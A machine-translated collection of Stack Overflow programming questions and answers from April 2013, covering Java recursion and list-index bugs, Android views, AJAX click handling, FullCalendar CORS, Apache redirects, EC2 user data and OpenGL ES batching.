> 时间：2013-04-05T03:46:04.010
> 
> 标签：java, recursion, stack-overflow

我有一个 int，“count”，它在每次递归后加一，但我还有一个 if 语句，一旦 int 等于或大于另一个整数，它就会停止递归。不知何故， if 语句被忽略了。

```
public static boolean wildcard(String x, String y, int substring, int count) {
    if (count >= y.length()){
        System.out.println("asdf");
        return true;
    }

    if (x.charAt(count) == y.charAt(count)){
        System.out.println("ALSKDFJKL");
        return wildcard(x, y, substring, count++);
    }
    if (y.charAt(count) == '*'){
        return wildcard(x.substring(substring), y, substring++, count);

    System.out.println("wildcard end");
    return false;
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T03:48:10.283

而不是`return wildcard(x, y, substring, count++);`尝试`return wildcard(x, y, substring, ++count);`

`count++`是一个后增量（意味着它会在方法返回后递增）

`return wildcard(x.substring(substring), y, substring++, count);`出于同样的原因，您可能还想更新。

另外，你的最后`if`一句话被打破了......我认为`System.out`并且`return false`想要在`if`街区之外

# java - Java 数组列表越界

> ID：15825574
> 
> 赞同：0
> 
> 时间：2013-04-05T03:46:16.520
> 
> 标签：java, arrays, arraylist

我知道这个问题已经被问了一百万次了。而且我觉得解决方案对于几个小时没有盯着它的人来说是相当明显的。但是我不能对我的越界异常做出正面或反面。这是错误：

```
exception in thread "main" java.lang.IndexOutOfBoundsException: Index: 207493, Size: 207493
    at java.util.ArrayList.rangeCheck(ArrayList.java:604)
    at java.util.ArrayList.get(ArrayList.java:382)
    at affysureselect.AffySureSelect.main(AffySureSelect.java:92)
Java Result: 1 
```

我在想这可能是由于数组列表的大小而发生的，但如果是这种情况，我会预计错误是在添加时出现，而不是在获取时出现。这是它正在死亡的代码：

```
 String chrompos;
    ArrayList<String> chromnum = new ArrayList<String>();
    while ((input2 = sbuff.readLine()) != null) {
        prse = input2.split("\t");
        chromnum.add(prse[0]);
        ...
        chrompos = prse[7];
     }
    int cnt = 0;
    int cnt2 = 0;
    if (chromnum.get(cnt).equals(chrompos)) { // line causing my untimely death
      end = Integer.parseInt(chromposend.get(cnt2));
      start = Integer.parseInt(chromposstart.get(cnt2));
       ... 
```

我什至尝试添加：

```
if (cnt <= chromnum.size()) { //this line
  if (chromnum.get(cnt).equals(chrompos)) { /before the dying line 
```

但它无论如何都会死，在获取时，而不是添加。我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:48:43.703

如果要增加 cnt，请确保它始终小于 chromnum.size()。

它应该是-

```
if (cnt < chromnum.size()) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:49:08.060

索引 i 不存在。您必须始终迭代到`list.size() - 1`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T03:49:30.107

`i`如果 的大小也是 ，`ArrayList`则无法访问索引`i`。最大可访问索引是`i-1`。因此，`IndexOutOfBoundsException`which 表示您正在尝试访问`207493`th 索引，即使您的大小`List`也是`207493`.

进行检查以限制`cnt`您的`list`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T03:50:17.687

因为，根据它看起来的代码，在**if**循环中你正在尝试一个

```
 chromnum.get(cnt) and cnt is initialized to 0. 
```

所以最可能的问题是代码从未进入while循环，在while循环之后放置一个SOP并检查arraylist的大小。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-05T03:51:40.630

去掉等号，

```
if (cnt < chromnum.size()) { //this line
      if (chromnum.get(cnt).equals(chrompos)) { 
```

希望能帮到你：）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-05T04:02:56.677

请记住，列表从 0 开始，因此如果您有 N 个项目的列表，则最后一项将是 N - 1（因为 0 是第一个元素，1 是第二个元素，依此类推）

所以你应该写

```
if (cnt < chromnum.size()) { 
```

代替

```
if (cnt <= chromnum.size()) { 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-05T05:34:26.193

1 基如帕斯卡：美国、讲英语的加拿大。
基于 0 的 C/Java：魁北克，（大部分？）欧洲。

这就是答案。问题是，电梯中的楼层是如何索引的。

# android - android：布局充气机

> ID：15825577
> 
> 赞同：0
> 
> 时间：2013-04-05T03:47:13.297
> 
> 标签：android, layout, view

在我的布局中，我想在用户单击按钮时在屏幕上添加图像。图像的数量取决于用户，即在运行时决定。布局充气器如何用于此目的，以便我的视图随用户输入动态变化。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:57:54.257

我认为在您的情况下不需要布局充气器，您可以在 Java 中动态创建图像视图并将其添加到您的主布局中。

```
LinearLayout ll=(LinearLayout)findViewById(R.id.yourLL);
while(count<yourusersimagesNeeded)
{
ImageView imageView = new ImageView(Activity);
// set src and other attrs
ll.addView(imageView);
count++;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:34:20.910

`ViewGroup`您可以使用该方法动态地将视图添加到 a中`addView(View)`。请参阅文档：http: [//developer.android.com/reference/android/view/ViewGroup.html](http://developer.android.com/reference/android/view/ViewGroup.html)

大致：

```
ImageView imageView = new ImageView(Activity);
imageView.setImageResource(R.drawable.my_image); // or setImageBitmap, etc
myRootView.addView(imageView); 
```

新视图的显示位置取决于它添加到的 ViewGroup 的布局类型。有关如何动态定位视图的更多信息，请参阅[LayoutParams上的文档。](http://developer.android.com/reference/android/view/ViewGroup.LayoutParams.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:36:15.117

假设您的活动布局是一个 LinearLayout “main_layout”，现在您可以使用以下代码动态添加错误的图像视图。

```
LinearLayout main_container = (LinearLayout) findViewById(R.id.main_layout);
LayoutInflater mInflater;
mInflater = LayoutInflater.from(YourActivity.this);

ImageView image = (ImageView) mInflater.inflate(R.layout.your_image_view, null);
main_container.addView(image); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T04:43:57.467

为什么需要布局充气机。您只需要在按钮单击时创建图像视图并将其添加到按钮下方或上方的布局（或您要添加的任何位置），如果您将侦听器添加到图像视图，也可以删除添加的图像，即单击图像视图从布局中删除。

# php - 暂停 JavaScript 函数 onclick

> ID：15825578
> 
> 赞同：0
> 
> 时间：2013-04-05T03:47:16.550
> 
> 标签：php, javascript, ajax

嗨，我是 JavaScript 和 AJAX 的新手。

此页面的想法是，当用户单击地图中图像中的适当区域时，当“field_X”中的条目为“0”时，它会调用 JavaScript 函数*myFunction1* - 然后此函数将“field_X”更新为“1”通过 AJAX（“field_X”以“0”条目开头）。

然后，当用户下一次单击地图中的同一区域时，调用*myFunction2*，因为“field_X”中的条目现在为“1” - 然后将“field_X”更新为“2”。

等等...

AJAX 调用工作正常，并在单独调用适当的函数时正确更新“field_X”。

但是问题是（使用我拥有的代码）当用户单击地图时，所有 3 个函数都会立即连续调用（并且“field_X”变为“3”）。我不知道如何在函数之间暂停它并等待用户的下一次点击。

我尽可能地缩写函数中的代码，因为函数也可以做其他事情。任何帮助，将不胜感激。

## PHP 用户页面

```
<?php function request_data(){select field_X from TABLE_X; }  
$q = request_data(); ?>  

<map>  
<area onclick= <?php    
    if ($q == '0') {?>"myFunction1();" <?php }  
    if ($q == '1') {?>"myFunction2();" <?php }  
    if ($q == '2') {?>"myFunction3();" <?php }   
    if ($q == '3') { ...and so on... }   
?> />  
</map> 
```

## JavaScript 页面

```
<script>   
//JavaScript  
function myFunction1() { update_1(); }  
function myFunction2() { update_2(); }  
function myFunction3() { update_3(); }  

//AJAX - abbreviated  
function update_1(){ update TABLE_X set field_X = (1); }  
function update_2(){ update TABLE_X set field_X = (2); }  
function update_3(){ update TABLE_X set field_X = (3); }  
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T07:55:52.003

你不能暂停 JS 的执行，不是真的......有一些 hacky 方法可以做到这一点，但它们会产生糟糕的代码，所以学习它们真的没有意义。正如评论中的一些人所建议的那样，我会使用全局（甚至更好：闭包）变量。这是我将在您的情况下使用的基本设置：

```
//server side, instead of echoing function1() etc...
echo 'var funcNumber = ';
switch($q)
{
    case 0: echo 1; break;
    case 1: echo 2; break;
    //and so on
}
echo ';';
//or better yet
echo 'var funcNumber  = '.($q + 1).';'; 
```

然后，在 JS

```
//var funcNmber = 1; ===> makes it a global var, which is not recommended
window.onload = function()
{
    var funcNmber = 1;//echo here if possible
    var handler = function(e)
    {//assign to var, you'll see why
        var ajax = nex XMLHttpRequest(),
        that = this, //this points to the clicked element, reference it by var that
        queryString = 'field=' + funcNumber;
        //your basic setup
        //followed by this piece of magic:
        this.onclick = null;//unbind handler
        ajax.onreadystatechange = function()
        {
            if (this.readyState === 4 && this.status === 200)
            {//call complete
                funcNumber++;//increment
                that.onclick = handler;//rebind event handler, that's why we named it
            }
        };
    };
    document.getElementById('areaId').onclick = handler;//bind handler
}; 
```

当然，这段代码仍然需要做很多工作。如果你想要一个 X 浏览器 XHTTP 对象，例如：

```
var getXHR = function()
{
    try
    {
        return new XMLHttpRequest();
    }
    catch (error)
    {
        try
        {
            return new ActiveXObject('Msxml2.XMLHTTP');
        }
        catch(error)
        {
            try
            {
                return new ActiveXObject('Microsoft.XMLHTTP');
            }
            catch(error)
            {
                throw new Error('no Ajax support?');
            }
        }
    }
}; 
```

此外，由于我们使用的是 X 浏览器，请注意这`window.onload`可能会导致内存泄漏，如果您了解事件委托和闭包的工作方式[，则很容易避免这种情况。](https://stackoverflow.com/questions/11186750/memory-leak-risk-in-javascript-closures)由于您对 JS 比较陌生，我怀疑您可能想阅读一下……这非常值得！

# fullcalendar - FullCalendar 跨域问题

> ID：15825581
> 
> 赞同：2
> 
> 时间：2013-04-05T03:47:28.590
> 
> 标签：fullcalendar, cors, crossdomain.xml

我正在尝试在我的本地主机上设置 FullCalendar 来测试它。这是代码：

```
$( '.calendar' ).fullCalendar( {
    header: {
        left: 'prev,next today',
        center: 'title',
        right: 'month,agendaWeek,agendaDay'
    },
    eventSources: [
        {
            url: "http://www.google.com/calendar/feeds/feed_one",
            className: 'feed_one'
        },
        {
            url: "http://www.google.com/calendar/feeds/feed_two",
            className: 'feed_two'
    ]
} ) 
```

相反，我在控制台中收到此错误，并且未显示事件：

```
XMLHttpRequest cannot load http://www.google.com/calendar/feeds/feed_one. 
Origin http://localhost is not allowed by Access-Control-Allow-Origin. localhost:1

XMLHttpRequest cannot load http://www.google.com/calendar/feeds/feed_two. 
Origin http://localhost is not allowed by Access-Control-Allow-Origin. localhost:1 
```

根据我的研究，这似乎是一个`Cross-Origin-Resource-Sharing`问题，但我不知道如何解决它。

如果有人可以帮助我，或者指出我正确的方向，将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T04:51:19.533

您需要为跨域访问发出 JSONP 请求。您能否设置以下属性并检查这是否适合您。

[您可以在此处](http://api.jquery.com/jQuery.ajax/)获取 JSONP 的详细说明...

```
eventSources: [
    {
        url: "http://www.google.com/calendar/feeds/feed_one",
        dataType : 'jsonp',
        className: 'feed_one'
    },
    {
        url: "http://www.google.com/calendar/feeds/feed_two",
        dataType : 'jsonp',
        className: 'feed_two',
] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-30T15:26:54.480

我有这个问题。添加到代码后已修复`<script type='text/javascript' src='fullcalendar-1.6.2/fullcalendar/gcal.js'></script>`

# java - 无法访问 ArrayList 对象方法

> ID：15825583
> 
> 赞同：0
> 
> 时间：2013-04-05T03:47:36.430
> 
> 标签：java, object, methods, arraylist

我正在尝试编写一个程序，从池中随机选择 3 个国家，然后将它们作为字符串输出。这些国家将依次获得金、银和铜牌。olympicResults 方法会将每个字符串添加到数组中。最终，所有国家将按照获得的金牌、银牌和铜牌数量进行排序。

我在使用 eventResult 方法时遇到问题 - 我似乎无法从我的国家/地区类访问方法，例如 getName() - 只是给了我找不到符号错误。当我在 eventResult 方法中初始化 ArrayList 之前，它似乎可以工作，但这不起作用，因为每次调用该方法时都会初始化一个新的 arraylist。

另一个问题是防止重复出现在 eventResult 字符串中的国家/地区 - 关于我做错了什么的任何想法？

代码：

```
public class OlympicMedals 
{
public static void main (String[] args)
{
    String[] countries = {"CAN", "BRB", "BLR", "HKG", "CHN", "SWE"}
    ArrayList<Country> list = new ArrayList<Country>();
    for (int j=0; j<9; j++) //initialize countries
    {
        list.add(new Country());
        list.get(j).setName(countries[j]);
    }

    Scanner scan = new Scanner(System.in);
    int n = scan.nextInt();

    Print(n, list);

}

public static String eventResult (ArrayList list) //generates result of discipline
{
    String res = "";
    Random rand = new Random();
    ArrayList<Country> listCopy = new ArrayList<Country>(list); 

    for (int i=0; i<3; i++) //generate list, prevent repeats
    {  
        int n = listCopy.size();
        int random = rand.nextInt(n);
        res += list.get(random).getName() + " ";

        if (i==0)
            list.get(random).setGold(1);
        if (i==1)
            list.get(random).setSilver(1);
        if (i==2)
            list.get(random).setBronze(1);

        listCopy.remove(random);
    }
    return res;           
}

public static String[] olympicResults(int n, ArrayList list) //array of strings from eventResult
{
    String[] result;
    result = new String[n];

    for (int i=0; i<n; i++)
    {
        result[i] = eventResult(list);
    }
    return result;
}

public static void Print(int n, ArrayList list)
{
    for (int i=0; i<n; i++) //print results
    {
        System.out.println(olympicResults(n, list)[i]);
    }
} 
```

国家级：

```
public class Country 
{
private int gold;
private int silver;
private int bronze;
private String name;

public Country() //default constructor
{
    setName("");
    setGold(0);
    setSilver(0);
    setBronze(0);
}

public void setName(String n)
{
    name = n;
}

public String getName()
{
    return name;
}

public void setGold(int g)
{
    gold += g;
}

public int getGold()
{
    return gold;
}

public void setSilver(int s)
{
    silver += s;
}

public int getSilver()
{
    return silver;
}

public void setBronze(int b)
{
    bronze += b;
}

public int getBronze()
{
    return bronze;
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:05:09.047

您可以尝试以下代码更改吗？

```
public static String eventResult (ArrayList<Country> list) //generates result of discipline
{
    String res = "";
    Random rand = new Random();
    ArrayList<Country> listCopy = new ArrayList<Country>(list); 

    for (int i=0; i<3; i++)  { 
        int random = rand.nextInt(listCopy.size());
        res += listCopy.get(random).getName() + " ";
        if (i==0)
            listCopy .get(random).setGold(1);
        if (i==1)
            listCopy .get(random).setSilver(1);
        if (i==2)
            listCopy .get(random).setBronze(1);

        listCopy.remove(random); // remove the country which received a medal from the list
    }    
    return res;           
} 
```

# android - 进度指示器资源

> ID：15825586
> 
> 赞同：0
> 
> 时间：2013-04-05T03:47:50.760
> 
> 标签：android

我一直在搜索 android 的资源和网络，但我无法找到旋转进度指示器的资源 ID 或其单独的组件。此资源是否存在于`android.R`？在哪里？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:29:40.437

[你可以在这里找到它的android平台资源样式](https://github.com/android/platform_frameworks_base/blob/master/core/res/res/values/styles.xml) ，搜索**Widget.ProgressBar**

# java - 当我想在方法中引用实例变量时，我应该使用“this”关键字吗？

> ID：15825590
> 
> 赞同：30
> 
> 时间：2013-04-05T03:48:34.553
> 
> 标签：java, scope, this, instance, local

我的老师说，当我尝试访问方法中的实例变量时，我应该始终使用`this`关键字，否则我会执行双重搜索。本地范围搜索，然后是实例范围搜索。

例子：

```
public class Test(){
    int cont=0;
    public void Method(){
        System.out.println(cont);//Should I use This.cont instead?
    }
} 
```

我希望他是错的，但我找不到任何论据。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2013-04-05T03:51:31.003

不，仅`this`在您有名称冲突时使用，例如当方法参数与其设置的实例字段具有相同名称时。

它可以在其他时候使用，但我们中的许多人认为它只是在代码中添加了不必要的冗长。

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2013-04-05T03:55:55.653

由于名称冲突，您*必须*在需要时使用`this`，但最好完全避免使用这些名称。

如果你愿意，你*可以*使用。`this`这纯粹是口味问题。

如果你的老师要求，你*应该*在你的功课中使用它。`this`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-05T03:53:33.657

`this`是实例中当前实例的别名或名称。它对于区分实例变量和局部变量（包括参数）很有用，但它本身可以用来简单地引用成员变量和方法，调用其他构造函数重载，或者简单地引用实例。
请参阅[Java - 何时使用“this”关键字](https://stackoverflow.com/questions/2429062/java-when-to-use-this-keyword)
也指当前对象。如果您的类具有变量 int A，并且该类的方法 xyz 部分具有 int A，则只是为了区分您指的是哪个“A”，您将使用 this.A。这只是一个示例案例。

```
public class Test
{
int a;

public void testMethod(int a)
{
this.a = a;
//Here this.a is variable 'a' of this instance. parameter 'a' is parameter.
}
} 
```

所以你可能会说
这个关键字可以用于（它不能与静态方法一起使用）：

```
 1)To get reference of an object through which that method is 
        called within it(instance method).
        2)To avoid field shadowed by a method or constructor parameter.
        3)To invoke constructor of same class.
        4)In case of method overridden, this is used to invoke method of current class.
        5)To make reference to an inner class. e.g ClassName.this 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-05T05:02:39.030

您的老师是正确的，如果您不使用`this`关键字，它将导致对编译器的双重搜索。首先，如果编译器无法在本地范围内找到变量，编译器将在本地范围内搜索，然后在实例范围内搜索。

此外，当编译器将您的代码转换为字节码时，编译器将为所有实例变量添加`this`关键字前缀。所以，如果你自己使用`this`关键字，你实际上是在减轻编译器的负担，并且代码编译得更快。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-05T04:00:04.987

既然大家都给出了名字消歧的例子，我就在使用`this`帮助的时候举个例子：

```
public class Person {
    private final firstName;
    private final lastName;
    private final Date birthdate;
    private final Address address;

    @Override
    public boolean equals(Object otherObject) {
        if (!(otherObject instanceof Person) {
            return false;
        }

        Person otherPerson = (Person) otherObject;

        // Using this here help distinguishing the current instance and the other.
        return this.firstName.equals(otherPerson.firstName)
            && this.lastName.equals(otherPerson.lastName)
            && this.birthdate.equals(otherPerson.birthDate)
            && this.address.equals(otherPerson.address);
    }

} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-05T03:52:06.210

`this`仅适用于参数与类属性同名的情况。

```
public class Dog {
   String name;
   public Dog(String name) {
      name = name; //but which name? Are we just assigning a variable to itself?
      // here you could say this.name = name. Or you could rename one of the variables to resolve ambiguity
   }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-05T03:52:14.633

由于自动完成（让生活更轻松），我偶尔会使用`this`它们，但之后我会清理它们。

请记住，清晰是关键。在这种情况下，很明显它`cont`是一个类变量，但如果你正在编写一个包含大量实例变量的巨大类，你可能会考虑使用它`this`以清楚起见。

您也只*需要*`this`在名称冲突时使用，例如

```
public class Ex {
    int num;
    public Ex(int num) {
        this.num = num; 
    }
} 
```

在此示例中，虽然 num = num 会导致冲突，但 "this" 避免了它。这是唯一绝对必要的时候，但同样，清晰度通常是更高的优先级。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-05T05:31:10.273

另一个`this`经常用于可读性的地方是当内部类对象引用其包含对象的字段时。

```
public class Foo {

    String foostring;
    /* snip lots of code */
    private class Foohelper {
        void helperMethod(String bazstring) {
             Foo.this.foostring = bazstring;
             // etc.
        }
    }
} 
```

编译器不需要这个，但它使寻找的情况`foostring`更加清晰。除了这个（！），我只完全限定了构造函数中的字段名称，它们可能被参数名称隐藏，正如许多其他海报在这里所说明的那样。

[编辑：现在我考虑了一下，编译器在某些地方需要这个，例如，如果`Foohelper.toString()`想调用`Foo.toString()`.]

# ios - iOS应用程序中的多个文本字段

> ID：15825593
> 
> 赞同：1
> 
> 时间：2013-04-05T03:49:04.247
> 
> 标签：ios, uitextfield, textfield

我的 iOS 应用程序的特定视图中有许多文本字段。一些文本字段具有弹出框控制器，而其他文本字段具有可以键入的文本字段。

我面临的问题是当我触摸文本字段时。在我结束编辑该特定文本字段之前，如果我触摸 popovercontroller，popovercontroller 和 textfields 都会出现在 UI 上。

如何避免这种情况？

抱歉含糊其辞。这是图像。我希望文本编辑器在触摸另一个文本字段时关闭。

![在此处输入图像描述](https://i.stack.imgur.com/wsyfM.png)

尝试这样做：

```
- (BOOL)textFieldShouldBeginEditing:(UITextField *)textField
{
    NSArray *subviews = [self.view subviews];
    for (id objects in subviews) {
        if ([objects isKindOfClass:[UITextField class]]) {
            UITextField *theTextField = objects;
            if ([objects isFirstResponder]) {
                [theTextField resignFirstResponder];
            }
        }
    }
    return YES;
} 
```

也不工作...需要一些指导...

也试过这个：

```
-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event{
      NSArray *subviews = [self.view subviews];
        for (id objects in subviews) {
            if ([objects isKindOfClass:[UITextField class]]) {
                UITextField *theTextField = objects;
                if ([objects isFirstResponder]) {
                    [theTextField resignFirstResponder];
                }
            }
        }
        return YES;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:58:51.000

试试这个：

```
[self.view endEditing:YES]; 
```

# objective-c - Xcode：如何将其放入循环中？

> ID：15825602
> 
> 赞同：-1
> 
> 时间：2013-04-05T03:50:17.547
> 
> 标签：objective-c, variables, loops

我对 xcode 相当陌生，并试图让我的代码更有效率。我有下面的代码，我想将末尾的重复行放入一个循环中（数组中有更多项目）。我确信这很简单，但我不知道如何评估循环中的变量。我显然也在问谷歌错误的问题，因为它没有帮助！

```
GlossaryDetailViewController *dController = segue.destinationViewController;
glossaryDict = glossaryArray [indexPath.row];
dController.detailLabelText = [glossaryDict objectForKey:@"Explanation"];
dController.detailTitle = [glossaryDict objectForKey:@"Term"];
NSMutableArray *labelArray;
labelArray = [glossaryDict objectForKey:@"Label"];
dController.labelString0 = labelArray[0];
dController.labelString1 = labelArray[1]; 
```

我知道如何创建循环，即 for(int i=0;i

任何指针都非常感谢。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:42:32.017

如果您问如何自动化这些：

```
dController.labelString0 = labelArray[0];
dController.labelString1 = labelArray[1];
dController.labelStringxx=labelArray[xx]; 
```

那么你有两种方法：

**将数组**用于所有单个属性`GlossaryDetailViewController`

```
for(NSInteger i=1; i<labelArray.count; i++){
    dController.labelString[i]=labelArray[i];
} 
```

或者，**使用键值编码**（如果您被限制不能更改类）：

```
for (NSInteger i=1; ;i++) { //still here you need to put 1 
    NSString *propertyName=[NSString stringWithFormat:@"labelString%d",i];
    if([dController respondsToSelector:NSSelectorFromString(propertyName)]){
        [dController setValue:labelArray[i] forKey:propertyName];
    }
    else break;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:55:21.397

我不能从你的问题中确切地说出来，但我认为你想要这样的东西

```
for (NSString *str in labelArray){
//do stuff with str
NSLog(@"%@", str);
} 
```

或者

```
for (int i = 0; i < [labelArray count]; i++){
dController.labelString[i] = labelArray[i];
} 
```

要执行第二个选项，您必须按照@Floris 所说的去做，并将其`labelStrings`放入一个数组中。

# apache - 使用虚拟主机和 htaccess 的重定向过多

> ID：15825608
> 
> 赞同：8
> 
> 时间：2013-04-05T03:51:10.117
> 
> 标签：apache, .htaccess, mod-rewrite, multiple-domains

## 我得到的问题是重定向太多。

我有一个托管几个站点的 WAMP 服务器，但我有一个包含大约 5 个域的特定站点。我希望它们都指向正确的网站文件夹，并将所有这些都重定向到单个域以用于 SEO 目的。这是它在虚拟主机文件中的样子：

```
<VirtualHost 50.62.82.101>
ServerAdmin info@hovaness.com
DocumentRoot "c:/wamp/www/example"
ServerName example.com
ServerAlias example.net www.example.com www.examples.net www.examples.com examples.com examples.net
ErrorLog "logs/example.com.log" 
```

htaccess 文件如下所示：

```
RewriteEngine On
RewriteRule ^(.*)$ http://sellingwarriors.com/$1 [R=301,L]
RewriteBase / 
```

我应该只有一个或另一个吗？我也尝试过在 htaccess 文件中：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(.*?).example(s?).(.*)$ [NC]
RewriteRule ^(.*)$ http://example.com/$1 [R=301,L]
RewriteBase / 
```

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-05T20:50:18.687

您需要检查您要重定向到的主机名，否则它将继续重定向：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} !^example\.com$ [NC]
RewriteRule ^(.*)$ http://example.com/$1 [R=301,L] 
```

# amazon-web-services - 在 EC2 每次启动时加载用户数据

> ID：15825622
> 
> 赞同：2
> 
> 时间：2013-04-05T03:52:24.043
> 
> 标签：amazon-web-services, amazon-ec2, user-data

我有 AWS EC2 实例。

我想在每次启动 EC2 实例时加载用户数据。

这是可能的还是我每次都必须创建新实例来执行用户数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:23:32.617

多种选择：

*   使用您想要的用户和配置创建自定义 AMI。最简单的方法是创建一个 EBS 支持的实例，进行设置，然后。选择仪表板选项以从实例创建 AMI。

*   在远程源（例如 s3）上进行设置，您的实例设置为提取和执行/添加/配置。

对于单个实例，AMI 运行良好。对于更大的环境，kickstart、puppet、chef、cfengine 或类似的配置管理会更好。

# java - 如何缩短此算法以查找素数？

> ID：15825624
> 
> 赞同：-3
> 
> 时间：2013-04-05T03:52:31.383
> 
> 标签：java, algorithm, loops, numbers, primes

只是想知道是否有人可以帮助我。该代码正在运行，但是是否可以在保持其方法相同的同时从该算法中缩短/删除一些不必要的代码？我已经取出了一些我不需要的东西，但不确定是否可以取出其他东西。

提前致谢！

```
public static void listPrimes(int maxNum) {
    for (int i = 2; i < maxNum; i++) {   
        boolean isprime = true;   

        for (int j = 2; j <= Math.sqrt(i); j++) {   
            if (i > 1 && j < i && i % j == 0) {   
                isprime = false;   
                break;   
            }
        }   

        if (isprime) {
            System.out.println(i); 
        } 
    } 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T07:03:23.510

好的，这不是缩短，而是加快。另请注意，有更有效的方法可以找到素数。

除了输出值之外，`Math.sqrt(i)`可能是最昂贵的操作（一旦数字开始变大，它可能会占用越来越多的处理时间），您可能需要考虑在循环之前将其放入变量中。

只有 2 和奇数是素数，因此您可以硬编码 2 并跳过所有偶数。

`i > 1 && j < i`如前所述，毫无意义。

缩短 - 您`isPrime`只需检查即可替换`j`。

```
public static void listPrimes(int maxNum) {
    System.out.println(2);
    for (int i = 3; i < maxNum; i += 2) {   
        int sqrtI = (int)Math.sqrt(i);
        int j;
        for (j = 2; j <= sqrtI; j++)
            if (i % j == 0)
                break;   

        if (j == sqrtI + 1)
            System.out.println(i); 
    } 
} 
```

# jsf-2 - 我如何有条件地停止执行 页面更改期间的页面事件

> ID：15825627
> 
> 赞同：0
> 
> 时间：2013-04-05T03:53:14.653
> 
> 标签：jsf-2, primefaces

在我的应用程序中，我有一个`<p:dataTable>`使用惰性数据模型的分页。

当我从一个页面单击另一个页面按钮时，我有一个要求，应该生成一个确认弹出窗口，如果我单击，`yes`那么我可以转到另一个页面，如果我单击“否”，那么我不能转到另一个页面，我会留下在该当前页面中。

.xhtml 代码如下：

```
<h:form id="userListForm">
    <p:dataTable var="user" id="userTable" value="#{userListController.userDataModel}" lazy="true" paginator="true" rows="25" paginatorPosition="bottom"
            paginatorTemplate="{CurrentPageReport}  {FirstPageLink} {PreviousPageLink} {PageLinks} {NextPageLink} {LastPageLink} {RowsPerPageDropdown}"
            rowsPerPageTemplate="25,50,100" widgetVar="userDataTable" styleClass="userTable" selectionMode="single" >
       <p:ajax event="page" />

       <p:column id="nameColumn" headerText="#{adbBundle['name']}"
           sortBy="#{user.fullName}" filterBy="#{user.fullName}" styleClass="userName">
           <h:outputText value="#{user.fullName}" />
       </p:column>

       <!-- other columns -->

    <:/p:dataTable>
</h:form> 
```

我正在使用 primefaces 3.4，jsf 2.0。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T06:57:44.420

从 RongNK 的答案中得到启发，您可以简单地这样做，

添加此脚本块：

```
<script type="text/javascript">
    function onPageStart() {
        return confirm('Are you sure?');
    }
</script> 
```

并将其放入您的数据表中：

```
<p:ajax event="page" onstart="return onPageStart()" /> 
```

你也可以用`<p:ajax`这种方式内联它：

```
<p:ajax event="page" onstart="return confirm('Are you sure?');" /> 
```

经过测试和使用 PrimeFaces 3.4.2

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:37:13.460

你试过了吗：

```
<p:ajax event="page" onstart="return tests()"/>

<script type="text/javascript">
                var vpage = 1;
                var prevvalue = vpage;
                function tests(){
                    if(confirm('Are you sure?')){
                        var p = userDataTable.getPaginator();
                        vpage = p.getCurrentPage();
                        prevvalue = vpage;
                        return true;}
                    else {
                        var p = userDataTable.getPaginator();
                        p.setPage(prevvalue,true);
                        return false;}
                }
            </script> 
```

# android - 在 OpenGL ES 中批处理多个矩形

> ID：15825629
> 
> 赞同：0
> 
> 时间：2013-04-05T03:53:19.280
> 
> 标签：android, performance, opengl-es

我目前通过遍历四边形三角形条并分别绘制每个三角形条来体验非常缓慢的性能，因此我想将所有矩形批处理到一个单独的绘制调用中。

环顾四周，似乎最好的方法是简单地发生复制顶点的开销并使用 GL_TRIANGLES 而不是 GL_TRIANGLE_STRIP，只需为每个矩形绘制两个单独的三角形。

问题是每个矩形都可以有不同的颜色，我需要以编程方式更改任何矩形的颜色。所以简单地使用一个 GL_TRIANGLES 调用并不能解决问题。相反，看起来我需要以某种方式用我的顶点数据索引颜色数据，将颜色与每个矩形相关联。我该怎么办？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:03:09.613

您可以使用顶点着色。

每个顶点都可以有多个数据通道，包括位置、颜色、（多个）纹理、法线等。

我建议直接[交错](http://iphonedevelopment.blogspot.com/2009/06/opengl-es-from-ground-up-part-8.html)你的顶点以一个接一个地包含位置和颜色。尽管您可以设置一个[单独的仅包含颜色的数组](http://iphonedevelopment.blogspot.com/2009/04/opengl-es-from-ground-up-part-2-look-at.html)并且也可以这样做（只需确保将颜色与位置正确对齐）。

